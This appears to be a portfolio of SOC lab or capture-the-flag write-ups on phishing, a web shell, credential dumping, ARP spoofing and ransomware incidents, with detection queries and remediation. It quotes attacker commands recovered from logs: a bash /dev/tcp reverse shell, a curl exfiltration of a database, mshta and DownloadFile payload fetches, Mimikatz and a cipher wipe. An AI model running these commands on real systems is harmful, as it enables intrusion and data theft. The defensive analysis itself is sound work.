docs.title: 📁 Case Study: First Shift
docs.text:
// MISSION_BRIEFING: AUTH_TRIAGE_INITIATED

Anomalous authentication events have been detected originating from unusual geolocations. Simultaneously, users are reporting suspicious emails. As the junior security analyst, my objective was to correlate these events, analyse the phishing payloads and decide whether the network had been breached.

● CLASSIFICATION: CONFIDENTIAL ● STATUS: INVESTIGATION_ACTIVE Task 3 Auth Triage Task 4 Phishing Books Task 5 Portal Drop Task 6 Zero Tolerance Task 7 Crown Jewel Task 8 Promotion

docs.title: Task 3 – Auth Triage
docs.text:
# 🕵️ Task 3: Probably Just Fine? Alert: Unusual VPN Login Tactic: Initial Access Malware: LummaStealer Investigating a "travelling user" alert that turned into the discovery of an infostealer infection. I went from checking one IP address to linking the malware to a wider Lumma campaign.

Summary

What happened: A VPN login came from a VPN/hosting provider (ASN 212238), not a hotel or mobile network. The user's machine held zY9sqWs.exe, a LummaStealer sample (57/71 AV detections), which most likely stole the credentials used for the login.

Impact: Likely credential theft from the endpoint and unauthorised VPN access with a valid account.

Key IOCs: ASN 212238 · zY9sqWs.exe · Trojan:Win32/LummaStealer.PM!MTB

🚨 Security Alert: Unusual VPN Activity

Trigger: An internal SOC alert flagged an unusual VPN login for a corporate user.

Initial Assessment: Context suggested the user might be traveling. However, standard procedure requires validating the source IP before dismissing it as benign.

Investigation Goal: Determine if the IP belongs to a legitimate ISP (hotel/airport) or a hosting provider (VPS/Proxy) often used by attackers.

docs.title: 🔎 Phase 1: Infrastructure Analysis
docs.text:
I started by checking the source IP address to determine its ownership and reputation.

Intel QueryFindings

Action: Enriched the IP address using internal threat intelligence tools to identify the Autonomous System Number (ASN) and service type.

Result: Suspicious Infrastructure

  • ASN: 212238
  • Service Type: VPN / Hosting Service

Assessment: While VPNs can be legitimate, adversaries frequently rent VPS infrastructure to anonymize their location. This contradicts the "hotel wifi" theory and warrants deeper investigation.

docs.title: 🦠 Phase 2: Malware Analysis
docs.text:
I pivoted to a suspicious binary found on the user's machine to see if it correlated with the VPN activity.

File ArtifactsEvidence SnapshotClassification
  • Filename: zY9sqWs.exe
  • File Type: Windows PE Executable (GUI)
  • Verdict: Malicious (57/71 Vendors)

Microsoft Detection: Trojan:Win32/LummaStealer.PM!MTB

Assessment: LummaStealer is a known infostealer malware family designed to harvest credentials, crypto wallets, and browser cookies. This confirms the machine is compromised.

docs.title: 🌐 Phase 3: Threat Intelligence & Attribution
docs.text: To understand the scope, I looked for links to wider campaigns.

docs.title: 1. YARA & Infrastructure Clustering
docs.text:
Searching the file hash showed that a Lumma YARA rule by kevoreilly (CAPE sandbox) matches the binary.

  • Rule logic: the rule matches Lumma-specific byte patterns. Its uint16(0) == 0x5a4d condition only checks that the file starts with MZ, so the rule runs on Windows executables alone.
  • Infrastructure: Analysis of TLS certificates linked to the command-and-control (C2) domain revealed 151 other domains sharing the same certificate. This indicates a large-scale, organized campaign.

docs.title: 2. Affiliate Network
docs.text:
Public reporting ("Behind the Curtain: How Lumma Affiliates Operate") describes the affiliate ecosystem around this malware family.

  • Collaborators: The Lumma developer began working with the GhostSocks proxy-malware team in early 2024.
  • Cross-Platform Threat: A Mexican-based affiliate in this network was also observed using CraxsRAT to target Android devices, showing the group's capability to pivot between mobile and desktop targets.

docs.title: 🗺️ MITRE ATT&CK Mapping
docs.text:
I mapped the activity to MITRE ATT&CK to guide detection.

T1583.003: Acquire Infrastructure The attacker used rented VPS/VPN infrastructure to hide their location and host C2. Resource Development T1555.003: Credentials from Web Browsers LummaStealer harvests saved browser passwords, cookies and session tokens. Credential Access T1078: Valid Accounts The stolen credentials were then used to log in to the corporate VPN. Initial Access

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

VPN login from hosting ASNImpossible travelInfostealer on the endpoint 

index=vpn action=success
| iplocation src_ip
| lookup asn_lookup ip AS src_ip OUTPUT asn asn_type
| where asn_type IN ("hosting", "vpn")
| stats count min(_time) AS first_seen BY user src_ip asn
Flags successful VPN logins from data-centre or commercial VPN ranges, which real travellers rarely use.

index=vpn action=success
| iplocation src_ip
| sort 0 user _time
| streamstats current=f last(lat) AS prev_lat last(lon) AS prev_lon last(_time) AS prev_time BY user
| eval hours=(_time-prev_time)/3600
| eval km=6371*2*asin(sqrt(pow(sin((lat-prev_lat)*pi()/360),2)+cos(prev_lat*pi()/180)*cos(lat*pi()/180)*pow(sin((lon-prev_lon)*pi()/360),2)))
| where hours>0 AND km/hours>900
Catches logins from two places too far apart to travel between in the time.

title: Unsigned executable reading browser credential stores
logsource: { product: windows, category: file_access }
detection:
  selection:
    TargetFilename|endswith:
      - '\Login Data'
      - '\Cookies'
      - '\logins.json'
  filter_browsers:
    Image|endswith: ['\chrome.exe', '\msedge.exe', '\firefox.exe']
  condition: selection and not filter_browsers
level: high

docs.title: 🛡️ Case Verdict
docs.text:
Confirmed Compromise
  • Malware: LummaStealer (Infostealer)
  • Vector: VPN credentials most likely stolen by the infostealer
  • Attribution: Lumma malware-as-a-service ecosystem (affiliate not confirmed)
Remediation Steps
  • Isolate the host and reimage it.
  • Revoke active VPN sessions and reset every password saved on the machine.
  • Require MFA for VPN, and alert on logins from hosting/VPN ASNs such as 212238.
  • Block the C2 domains and the TLS certificate fingerprint they share.

docs.title: Task 4 – Phishing
docs.text:
# 🎣 Task 4: Phishing Books Alert: MFA Fatigue Vector: Email Attachment Suspected Actor: Silent Librarian A user reported MFA spam, leading to the discovery of a targeted phishing campaign against university staff. I analysed the email headers, deobfuscated the HTML attachment and compared the activity with a known threat group.

Summary

What happened: The user received an email from a look-alike library domain with the attachment library-invoice.pdf.html. Obfuscated JavaScript in the file redirected to a fake library login page that harvested the user's password. The attacker then spammed MFA prompts hoping the user would approve one.

Impact: The user's password is compromised. MFA was the only thing stopping account takeover.

Key IOCs: lib-service.com:8083 · xn--librarytlu-13cwe32432-kwr.com:8082 · MD5 442f2965cb6e9147da7908bb4eb73a72

🚨 Security Alert: MFA Fatigue

Trigger: A university staff member reported receiving multiple MFA approval prompts without initiating a login.

Initial Hypothesis: The user's credentials have likely been compromised, and the attacker is attempting to bypass 2FA by annoying the user into clicking "Approve."

Investigation Goal: Analyze the source email to identify the phishing infrastructure and confirm how the credentials were stolen.

docs.title: 📧 Phase 1: Delivery & Infrastructure
docs.text:
I started with the email headers and sender infrastructure to understand how the message reached the inbox.

Authentication ChecksSender LegitimacyMITRE Mapping

Objective: Check whether the sending domain authenticates its mail.

  • SPF: none
  • DKIM: none
  • DMARC: none

Evidence:

Security Gap

The sending domain is a look-alike the attacker owns, and it publishes no SPF, DKIM or DMARC records. The university's own DMARC policy could not have stopped this, because the email did not claim to come from the university's domain. The gap is on the receiving side: the mail filter delivered a message that passed no authentication checks, from a newly seen domain, with an HTML attachment.

Technique: Typosquatting The sender domain closely resembled a legitimate university library service. Minor character substitutions were used to mimic trusted infrastructure.

T1583.001 – Acquire Infrastructure: Domains

The attacker registered and operated look-alike domains specifically to support phishing delivery.

docs.title: 📦 Phase 2: Payload Forensics
docs.text:
The email contained a suspicious attachment named library-invoice.pdf.html.

Attachment AnalysisLanding Page

Objective: Determine the nature of the attached file.

  • Filename: library-invoice.pdf.html
  • Technique: Double extension (.pdf.html) to trick users.
  • MD5: 442f2965cb6e9147da7908bb4eb73a72

Objective: Identify where the phishing attachment redirected the victim.

  • URL: http://lib-service.com:8083
  • Context: Impersonated a university library login portal to harvest credentials.

docs.title: 🧬 Phase 3: Code Deobfuscation
docs.text:
The HTML file contained obfuscated JavaScript (T1027) using Unicode escaping and string reversal. I used CyberChef to reveal the logic.

Hidden MessageRedirect Logic

Discovery: Hidden developer comment revealed inside the code.

"I love to phish books from libraries ^^"

Assessment: Confirms intentional malicious authorship and a "playful" campaign tone.

Logic Identification: I isolated the JavaScript responsible for decoding the URL at runtime.

var src = reversed.split("").reverse().join("");

Redirect Chain: 1. Initial: http://xn--librarytlu-13cwe32432-kwr.com:8082 (Punycode) 2. Final: http://lib-service.com:8083

docs.title: 🏴‍☠️ Phase 4: Threat Attribution
docs.text:
The targeting (university staff), the look-alike domains and the library-portal lure all match the known tradecraft of one group. This is a low-confidence attribution based on TTPs only; no infrastructure overlap was confirmed.

Suspected Actor: Silent Librarian (Cobalt Dickens) An Iran-linked group (also tracked as TA407) that known for targeting research institutions and universities to steal academic credentials and proprietary data.

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

MFA prompt spamHTML attachments with double extensionsMail failing all authentication 

index=auth signature="MFA request" result IN ("denied", "timeout")
| bin _time span=10m
| stats count BY _time user src_ip
| where count >= 5
Five or more denied or ignored MFA prompts in ten minutes is a strong sign of MFA fatigue (T1621).

index=email attachment_name=*
| regex attachment_name="(?i)\.(pdf|docx?|xlsx?)\.html?$"
| table _time sender recipient subject attachment_name
Catches lures like library-invoice.pdf.html.

index=email spf=none dkim=none dmarc=none
| stats count values(subject) AS subjects BY sender_domain
Look-alike domains rarely bother setting up email authentication.

docs.title: 🛡️ Case Verdict
docs.text:
Confirmed Phishing
  • Technique: Typosquatted domain + HTML attachment with obfuscated JavaScript redirect
  • Vector: Credential harvesting via fake login (T1566.001)
  • Follow-on: MFA fatigue (T1621)
  • Gap: Unauthenticated mail from a new domain was delivered
Remediation Steps
  • Reset the user's password and revoke active sessions.
  • Block lib-service.com and the Punycode domain at the mail gateway and web proxy.
  • Quarantine or block .html attachments from external senders.
  • Switch MFA to number matching so a single tap cannot approve a login.
  • Search other mailboxes for the same sender and attachment hash.
← Previous: Task 3 Back to Case File

docs.title: Task 5 – Portal Drop
docs.text:
# 🚨 Task 5: CRM Compromise Alert: Web Shell Vector: Brute Force Tactic: Exfiltration Investigating a full compromise of the CRM portal. I tracked the attacker from the brute-force attempts to the web shell upload, payload decoding and final data exfiltration.

Summary

What happened: 34.67.91.83 brute-forced the CRM login, uploaded a PHP web shell (invoice.php), opened a reverse shell to 115.58.148.86:8080, read the CRM config and uploaded the production database to portaldrop2025.xyz.

Impact: Full server compromise and theft of the production CRM database.

Key IOCs: 34.67.91.83 · 115.58.148.86 · portaldrop2025.xyz · /CRM/portal/uploads/invoice.php

🚨 EDR Alert: Suspicious File Write

Trigger: The EDR agent on TPMHQ-CRM01 flagged a suspicious file creation event in the web directory.

File: /var/www/html/CRM/portal/uploads/invoice.php Process: php-fpm7.4 (Web Server)

Investigation Goal: Trace the attack vector from the initial web logs to the final data exfiltration command.

docs.title: 🚪 Phase 1: Access Analysis (Logs)
docs.text:
I started with the Apache access logs to see how the attacker got past authentication.

1. Attacker IP2. Brute Force Counts3. Tool Switch

Finding: A single IP address, 34.67.91.83, generated a high volume of traffic compared to other sources.

Finding: Counting POST requests to login.php by response code shows a brute-force pattern.

  • 401 (rejected): 35
  • 200 (OK): 18

A 200 response on its own does not prove a login worked, because many apps return 200 for a failed login page too. What confirms success here is what came next: the same IP made an authenticated upload to /CRM/portal/upload.php.

Finding: The attacker initially used PF-Scanner/1.0 for reconnaissance, then switched to python-requests/2.31.0 for the actual exploit.

docs.title: 🐚 Phase 2: Weaponization (Web Shell)
docs.text:
After gaining access, the attacker automated the upload of a malicious PHP file.

Upload LogEDR Alert: SummaryEDR Alert: Details

Finding: The logs show a POST request to /CRM/portal/upload.php.

  • File: invoice.php
  • Time: 14:27:34
  • Tool: python-requests/2.31.0

EDR Detection: "Suspicious File Write: Backdoor:PHP/Generic"

The EDR flagged this because the file was written by the www-data user, indicating the web server itself created the file (a classic web shell indicator).

IOC Details:

  • File Path: /var/www/html/CRM/portal/uploads/invoice.php
  • Process Image: /usr/sbin/php-fpm7.4

docs.title: ⚡ Phase 3: Execution & Payloads
docs.text:
The attacker ran commands by passing Base64-encoded strings to the invoice.php web shell. I decoded them in CyberChef to see what they did.

Command 1: ReconCommand 2: Reverse ShellMITRE T1505.003

Encoded Payload: ZDJodllXMXA

Decoded: ZDJodllXMXA → d2hvYW1p → whoami

The command was Base64-encoded twice, a simple trick to slip past filters that only decode once.

The attacker verified they had code execution on the server.

Encoded Payload: Ww1GemFDQXRh...

Decoded: 

bash -i >& /dev/tcp/115.58.148.86/8080 0>&1

This command opened a reverse shell connection back to the attacker's listener on port 8080.

Technique Alignment: Server Software Component: Web Shell.

Adversaries use web shells to establish persistent access to web servers.

docs.title: 📤 Phase 4: Discovery & Exfiltration
docs.text:
With a stable shell, the attacker moved to their final objective: stealing data. The EDR process tree captured the exact commands.

1. Config Theft2. Database Exfiltration

Process Chain: bash -> cat

Command: cat /etc/trycrm/config.json

The attacker read the CRM configuration file, likely to find database credentials.

Process Chain: bash -> curl

Command: 

curl -sS -T /var/lib/trycrm/prod.db https://portaldrop2025.xyz/x7Ja0mlqP

Action: The attacker exfiltrated the production database (prod.db) to a remote drop site.

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

Login brute forceWeb server spawning a shellPHP written to uploads folder 
index=web sourcetype=access_combined method=POST uri_path="*login.php"
| bin _time span=5m
| stats count(eval(status=401)) AS failed count(eval(status=200)) AS ok BY _time clientip
| where failed >= 10


title: Web server process spawning a shell or network tool
logsource: { product: linux, category: process_creation }
detection:
  selection:
    ParentImage|endswith: ['/php-fpm7.4', '/apache2', '/httpd', '/nginx']
    Image|endswith: ['/bash', '/sh', '/curl', '/wget', '/nc']
  condition: selection
level: high
This one rule would have caught the reverse shell, the config read and the exfiltration.

index=edr event_type=file_create file_path="*/uploads/*"
    (file_name="*.php" OR file_name="*.phtml")
| table _time host user process file_path

docs.title: 🛡️ Case Verdict
docs.text:
Critical Compromise
  • Attacker IP: 34.67.91.83
  • C2 IP: 115.58.148.86
  • Exfil Site: portaldrop2025.xyz
  • Data Lost: Production CRM database (prod.db) and config
Remediation Steps
  • Isolate TPMHQ-CRM01 and remove invoice.php.
  • Rotate every secret in config.json and reset the brute-forced account.
  • Block 34.67.91.83, 115.58.148.86 and portaldrop2025.xyz.
  • Fix the upload form: allow-list file types and stop PHP executing in uploads/.
  • Add login rate limiting and MFA to the CRM portal.
  • Assess the stolen database for personal data and breach-notification duties.
← Previous: Task 4 Return to Dashboard

docs.title: Task 6 – Zero Tolerance
docs.text:
# 🏹 Task 6: Zero Tolerance Alert: Credential Dumping Vector: LNK Phishing Tactic: Lateral Movement A full threat hunt across the network. I traced the initial compromise to a malicious LNK file, followed the attacker's use of a LOLBin (`mshta.exe`) and found a script staging backup data for theft.

Summary

What happened: jp.brown opened TravisClart_Resume.pdf.lnk, which ran mshta.exe to fetch an HTA from 10.10.14.174. The attacker downloaded a fake RuntimeBroker.exe, dumped credentials with Mimikatz, moved to BKUP-SRV01 and ran a script that gathered .bak, .sql and .mdb files into one archive.

Impact: Domain credentials exposed; database backups staged for exfiltration.

Key IOCs: 10.10.14.174 · TravisClart_Resume.pdf.lnk · KsWLx.hta · C:\Windows\Temp\RuntimeBroker.exe · Setup-BackupServer.ps1

🚨 Incident Scope

Trigger: Splunk detected suspicious PowerShell execution and AV tampering attempts.

Beachhead Host: JP-BROWN-WS Attacker C2: 10.10.14.174

Investigation Goal: Reconstruct the attack chain from the initial download to the final data exfiltration.

docs.title: 🎣 Phase 1: Initial Access (Spearphishing)
docs.text:
First I needed to find how the attacker got in, so I looked at host activity and browser history.

1. Host Identification2. Browser Forensics3. Splunk Verification4. MITRE Context

Query: I ranked hosts by Sysmon event volume to find the likely first victim.

Result: JP-BROWN-WS accounts for 72% of the traffic, making it my primary suspect.

Tool: SQLite Viewer Evidence: Analyzing the browser's Downloads database revealed a suspicious LNK file download.

  • File: TravisClart_Resume.pdf.lnk
  • Path: C:\Users\jp.brown\Downloads\

Query: index=* *TravisClart_Resume*

Splunk confirmed the creation of the file on disk.

Technique: T1204.002 (Malicious File)

The attacker relies on the user executing a file disguised as a resume to initiate the infection chain.

docs.title: 📡 Phase 2: Execution & C2
docs.text:
Once the user clicked the file, the attacker executed code to establish a connection.

1. The LOLBin (Mshta)2. C2 Download

Technique: T1218.005 (Mshta)

The LNK file triggered a "Living-off-the-Land" binary to execute a remote script from memory.

Command: 

"C:\Windows\System32\mshta.exe" http://10.10.14.174:80/KsWLx.hta

Masquerading: The attacker downloaded a payload named RuntimeBroker.exe to C:\Windows\Temp.

Splunk Log: 

DownloadFile('http://10.10.14.174:80/RuntimeBroker.exe', 'C:\Windows\Temp\RuntimeBroker.exe')

docs.title: 🔐 Phase 3: Credential Access
docs.text:
With a foothold on the workstation, the attacker dumped credentials to move deeper into the network.

1. Mimikatz Detection2. Command Analysis

Alert: I found multiple command lines referencing Invoke-Mimikatz.

Stats: The logs show a clear spike in mimikatz.exe and cmd.exe activity.

Specific Command: 

Invoke-Mimikatz -DumpCreds

This command dumps plain-text passwords and hashes from memory (LSASS).

docs.title: 📤 Phase 4: Lateral Movement
docs.text:
Finally, the attacker moved from JP-BROWN-WS to the backup server BKUP-SRV01.

1. Pivot to Backup2. Exfiltration Script

Target Host: BKUP-SRV01

The logs show commands running on the backup server as bkup-svc. The most likely explanation is that this service account's credentials were among those dumped by Mimikatz.

Script: C:\Windows\Temp\Setup-BackupServer.ps1

The attacker used this script to collect files with sensitive extensions (.bak, .sql, .mdb) and stage them in a temporary DAT file: C:\Users\bkup-svc\AppData\Local\Temp\sysbackup_20251114.dat

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

mshta loading a remote scriptSystem binary name in wrong folderMimikatz in PowerShell 
title: Mshta executing remote HTA
logsource: { product: windows, category: process_creation }
detection:
  selection:
    Image|endswith: '\mshta.exe'
    CommandLine|contains: ['http://', 'https://']
  condition: selection
level: high


index=sysmon EventCode=1 Image="*\\RuntimeBroker.exe"
    NOT Image="C:\\Windows\\System32\\RuntimeBroker.exe"
| table _time host User Image ParentImage CommandLine
Catches masquerading (T1036.005), such as RuntimeBroker.exe running from C:\Windows\Temp.

index=* (EventCode=4104 OR EventCode=1)
    ("Invoke-Mimikatz" OR "sekurlsa::" OR "-DumpCreds")
| table _time host user CommandLine ScriptBlockText
Event 4104 is PowerShell script block logging.

docs.title: 🛡️ Case Verdict
docs.text:
Major Breach Confirmed
  • Attacker C2: 10.10.14.174
  • Lateral Move: JP-BROWN-WS → BKUP-SRV01 (as bkup-svc)
  • Data Risk: Database backups staged in sysbackup_20251114.dat
Containment Plan
  • Isolate JP-BROWN-WS and BKUP-SRV01.
  • Reset bkup-svc and every account logged on to the workstation, since Mimikatz exposes them all.
  • Block 10.10.14.174 and check whether the staged .dat file left the network.
  • Block mshta.exe for standard users and stop .lnk files arriving by download or email.
← Previous: Task 5 Return to Dashboard

docs.title: Task 7 – Crown Jewel
docs.text:
# 📡 Task 7: Network Forensics Alert: ARP Spoofing Tool: Wireshark Tactic: Credential Harvesting Analysing a man-in-the-middle (MITM) attack. I found ARP poisoning used to intercept traffic, recovered cleartext credentials from the capture and identified a DNS exfiltration tunnel.

Summary

What happened: A host with MAC 00:0c:29:11:22:33 poisoned ARP caches to impersonate the gateway (10.10.10.1), intercepted a cleartext HTTP login for dev_user, kept a reverse shell open from 10.10.10.100 and pushed data out through 500+ DNS queries to exfil-domain.xyz.

Impact: Developer credentials stolen; data exfiltrated over DNS.

Key IOCs: MAC 00:0c:29:11:22:33 · 10.10.10.100 · exfil-domain.xyz · User-Agent CVE-202X-EXPLOIT

🚨 IDS Alert: Suspicious Outbound Traffic

Trigger: Network IDS flagged a "Reverse Shell Outbound Connection" and anomalous ARP broadcasts.

Suspect Host: 10.10.10.100 Destination: 1.1.1.1:8080

Investigation Goal: Analyze PCAP and Splunk logs to determine what data was intercepted.

docs.title: 🦈 Phase 1: Man-in-the-Middle (ARP Spoofing)
docs.text:
The attacker launched an ARP Spoofing attack to position themselves between the victims and the gateway.

1. Wireshark Evidence2. Splunk Stats

Observation: A flood of ARP replies claiming 10.10.10.1 (Gateway) and 10.10.10.150 (Victim) are at the same MAC address.

  • Attacker MAC: 00:0c:29:11:22:33
  • Impersonated IP: 10.10.10.1

Query: index=* log_type=arp | table _time sender_ip sender_mac target_ip target_mac

Splunk recorded 90 spoofing events, confirming a sustained attack.

docs.title: 🔓 Phase 2: Credential Harvesting
docs.text:
With the traffic intercepted, the attacker captured unencrypted POST requests containing sensitive login information.

1. Exploit Attempt2. Cleartext Creds

Target: Jira Instance User-Agent: CVE-202X-EXPLOIT

The User-Agent string names an exploit outright. Real attackers usually hide behind normal browser strings, so a value like this is a gift to defenders: a simple User-Agent watchlist would catch it.

PCAP Analysis: Follow TCP Stream (Port 80).

I recovered the following credentials from a captured HTTP POST request:

  • URL: http://internal.login.local/login.php
  • Payload: username=dev_user&password=SecretPassword!

docs.title: 📤 Phase 3: C2 & Exfiltration
docs.text:
Finally, I analysed how the attacker communicated externally and stole data.

1. Reverse Shell2. DNS Exfiltration

IDS Alert: Reverse Shell Outbound Connection Detected

  • Source: 10.10.10.100
  • Destination: 1.1.1.1 (Port 8080)

In the real world 1.1.1.1 is Cloudflare's public DNS resolver, so traffic to it on a non-DNS port like 8080 stands out as abnormal.

This confirms the attacker has a live interactive session on the host.

Protocol: DNS Tunneling

I found high-frequency DNS queries to a suspicious domain. This technique hides data inside the subdomains of DNS requests (e.g., encoded-data.exfil-domain.xyz).

  • Exfil Domain: exfil-domain.xyz
  • Count: 500+ Queries

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

ARP spoofingDNS tunnellingCleartext logins 

index=* log_type=arp
| stats dc(sender_mac) AS macs values(sender_mac) AS mac_list BY sender_ip
| where macs > 1
One IP announced by more than one MAC address is the classic ARP poisoning signal.

index=dns
| rex field=query "^(?<sub>.+)\.(?<domain>[^.]+\.[^.]+)$"
| eval sub_len=len(sub)
| stats count avg(sub_len) AS avg_len dc(sub) AS unique_subs BY src_ip domain
| where count > 100 AND (avg_len > 30 OR unique_subs > 50)
Lots of long, unique subdomains for one parent domain points to data hidden in DNS.

index=network dest_port=80 http_method=POST
    (form_data="*password=*" OR uri_path="*login*")
| table _time src_ip dest_ip uri_path

docs.title: 🛡️ Case Verdict
docs.text:
Network Compromise
  • Technique: ARP Spoofing (MITM)
  • Stolen Data: Dev Credentials (Cleartext)
  • Exfiltration: DNS Tunneling via exfil-domain.xyz
Remediation Steps
  • Enable Dynamic ARP Inspection (DAI) on switches.
  • Force HTTPS for all internal login pages.
  • Reset dev_user and isolate 10.10.10.100.
  • Block exfil-domain.xyz at the DNS resolver and only allow DNS through internal resolvers.
  • Patch the Jira instance against the exploited CVE.
← Previous: Task 6 Return to Dashboard

docs.title: Task 8 – Promotion Night
docs.text:
# 🎖️ Task 8: Promotion Night Alert: Ransomware Tactic: Cloud Pivot Ransomware: BabyLockerKZ The final investigation. The attacker deployed ransomware on-premises, kept access through a scheduled task and a Run key, then used stolen AWS keys to steal backups from S3.

Summary

What happened: gaze.exe was copied from the domain controller's SYSVOL share and run, encrypting files to .danger17 and wiping free space with cipher /w. The attacker scanned SRV-ITFS, set up persistence, read cloud-keys.csv, logged in to AWS from 152.42.128.207, downloaded two backup archives and left YOU-HAVE-BEEN-PWNED.txt in the bucket.

Impact: On-premises files encrypted; cloud backups stolen (double extortion).

Key IOCs: gaze.exe (MD5 8BA3A306F5550374490030EA472F2F92) · .danger17 · ruche.dll · task LanguageSync · 152.42.128.207

🚨 Critical Incident: Full Compromise

Impact: On-premises ransomware + theft of AWS backups Ransom Extension: .danger17

Narrative: The attacker used gaze.exe to encrypt local files, then abused WMI for lateral movement. They then found a CSV file containing AWS keys, which let them pivot to the cloud, steal data and upload a ransom note.

docs.title: 🦠 Phase 1: Ransomware Deployment
docs.text:
The attack began with the execution of a binary named gaze.exe, which propagated itself via the Domain Controller's SYSVOL share.

1. Distribution2. Encryption Behavior3. Persistence4. Timeline

Mechanism: The attacker copied the malware to the domain controller to ensure network-wide execution.

Command: 

cmd.exe /c copy \\DC-01\SYSVOL\gaze.exe C:\Windows\Temp\gaze.exe

Artifacts: Files were encrypted with the extension .danger17.

Anti-Forensics: I saw cipher.exe /w used to overwrite free disk space, so deleted original files cannot be recovered.

Registry Value: BabyLockerKZ

BabyLockerKZ is the name public reporting (Cisco Talos) gives to a variant of the MedusaLocker ransomware family.

The malware created a registry run key to ensure it executes on every reboot.

Host: DESKTOP-J9PR0CO

A timeline analysis confirms the execution of gaze.exe followed by the cipher wipe command.

docs.title: 🔬 Phase 2: Malware Analysis (IOCs)
docs.text:
I pulled the sample's hashes from Sysmon process-creation logs (Event ID 1).

1. Hash Analysis2. Cipher Command

File: C:\Windows\Temp\gaze.exe (run by DECEPT\eric.portman on SRV-JMP)

  • MD5: 8BA3A306F5550374490030EA472F2F92
  • SHA256: 6D000A159FE10AF1B29DDF4E4015931A9E9D0A020AEEF0C602D8C5419B5966E6
  • Imphash: 1CC690A422707DB94DD0913CD9980C27

Command: cipher /w:\\?\C:

This overwrites the free space on C:, destroying deleted files so investigators cannot recover the unencrypted originals.

docs.title: 🕷️ Phase 3: Lateral Movement & Persistence
docs.text:
Once inside, the attacker used living-off-the-land techniques to scan the network and maintain access.

1. WMI Scanning2. MITRE Context3. Scheduled Task (XML)4. Task Creation Log

Technique: T1047 (Windows Management Instrumentation)

The attacker scanned SRV-ITFS on ports 135, 139, 445, 3389, 5985.

Technique T1047: Adversaries use WMI to execute malicious commands and payloads on remote systems.

Task Name: LanguageSync Payload: C:\Windows\System32\fr-FR\ruche.dll

The persistence mechanism was disguised as a legitimate "LanguageSync" task executing a DLL.

Event ID 4698: This Windows Security Event confirms the creation of the scheduled task LanguageSync.

docs.title: ☁️ Phase 4: The Cloud Pivot
docs.text:
The most critical moment occurred when the attacker found a file containing cleartext cloud credentials.

1. Credential Theft2. AWS Access

Source: \\SRV-ITFS\Integrations\cloud-keys.csv

Audit logs (Event 4663) show the attacker accessing this sensitive CSV file containing AWS keys.

Source IP: 152.42.128.207

Shortly after the CSV was read, I found a login to the AWS environment from this external IP.

docs.title: 📤 Phase 5: Exfiltration & Defacement
docs.text:
With AWS access, the attacker stole critical data and left a message.

1. Data Exfiltration2. Ransom Note

Files Stolen: beta.tar.gz, latest.tar.gz

CloudTrail logs show GetObject events for these critical backup archives.

Message: YOU-HAVE-BEEN-PWNED.txt

The attacker uploaded this note to the S3 bucket to prove access and pressure the victim.

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

Free-space wipeExecutable copied from SYSVOLCloud keys used from a new IP 

title: Cipher used to wipe free space
logsource: { product: windows, category: process_creation }
detection:
  selection:
    Image|endswith: '\cipher.exe'
    CommandLine|contains: '/w'
  condition: selection
level: high
Legitimate use is rare; during an incident this is a strong ransomware signal.

index=sysmon EventCode=1 CommandLine="*SYSVOL*" CommandLine="*.exe*"
    (CommandLine="*copy*" OR CommandLine="*xcopy*")
| table _time host User CommandLine


index=aws sourcetype=aws:cloudtrail
| stats earliest(_time) AS first_seen values(eventName) AS actions BY userIdentity.accessKeyId sourceIPAddress
| where first_seen > relative_time(now(), "-1d")
Flags an access key appearing from an IP it has never used before.

docs.title: 🛡️ Case Verdict
docs.text:
Full Compromise (On-Prem + Cloud)
  • Ransomware: BabyLockerKZ (gaze.exe, .danger17)
  • Persistence: Run key + scheduled task LanguageSync
  • Cloud: AWS keys from cloud-keys.csv used to steal S3 backups
Remediation Steps
  • Disable and rotate the AWS keys; review CloudTrail for every action taken with them.
  • Remove gaze.exe from SYSVOL, the Run key and the LanguageSync task.
  • Restore from offline backups, and store backups where domain or cloud admin keys cannot delete them.
  • Move secrets out of file shares into a secrets manager.
← Previous: Task 7 Back to Dashboard

docs.title: 📂 Operation: Honeynet Collapse
docs.text:
// MISSION_BRIEFING: DECEPTITECH_INCIDENT

A sophisticated ransomware campaign has successfully targeted the DeceptiTech corporate network. As the forensic analyst, my objective was to reconstruct the multi-stage attack chain: a WordPress brute force on a Linux server, lateral movement into Windows, data theft, ransomware, and macOS exfiltration.

Task 01 Initial Access Task 02 Windows Triage Task 03 Memory Forensics Task 04 Disk Analysis Task 05 File System Task 06 MacOS Forensics

docs.title: Task 1 Initial Access
docs.text:
# 🐧 Task 1: Initial Access Pot Alert: WordPress Brute Force Tactic: Initial Access Technique: Web Shell Investigating the collapse of the DeceptiTech network. I traced the attack from a brute-force entry on a Linux web server to root privilege escalation and internal network pivoting.

Summary

What happened: The attacker brute-forced /wp-login.php, planted a web shell in the Blocksy theme's 404.php, used an SSH key backup that low-privileged users could read (/etc/ssh/id_ed25519.bak) to log in as root, installed a fake kworker service for persistence and scanned 172.16.8.216 for SSH, HTTP and RDP.

Impact: Full root compromise of the Linux web server, used as a pivot into the internal network.

Key IOCs: 404.php web shell · /usr/sbin/kworker (MD5 d6f2d80e78f264aff8c7aea21acb6ca6) · target 172.16.8.216

🚨 Security Alert: Validated Breach

Trigger: Massive volume of HTTP POST requests targeting the web server, followed by suspicious root-level command execution.

Initial Assessment: The attacker exploited weak credentials on the WordPress instance to establish a foothold before pivoting to the underlying operating system.

Investigation Goal: Reconstruct the kill chain, from the first login attempt to the malware installation, and regain control of the compromised system.

docs.title: 🔎 Phase 1: Web Application Reconnaissance
docs.text:
I began with the web root directory to confirm the application type and identify the entry vector.

Directory AnalysisFindings

Action: Listing the /var/www/html/wordpress directory confirmed a standard WordPress installation.

Result: Brute Force Target

Observation: Access logs indicated a high frequency of POST requests targeting the login portal.

Finding: /wp-login.php

Assessment: The burst of login POSTs, followed by theme files being edited, shows the attacker got in with a guessed WordPress password.

docs.title: 🛡️ Phase 2: Monitoring Verification
docs.text:
Before digging deeper, I checked that the system was actually logging the attacker's actions.

Audit Rules

Action: I inspected /etc/audit/audit.rules to verify that the Linux Audit Daemon (auditd) was active.

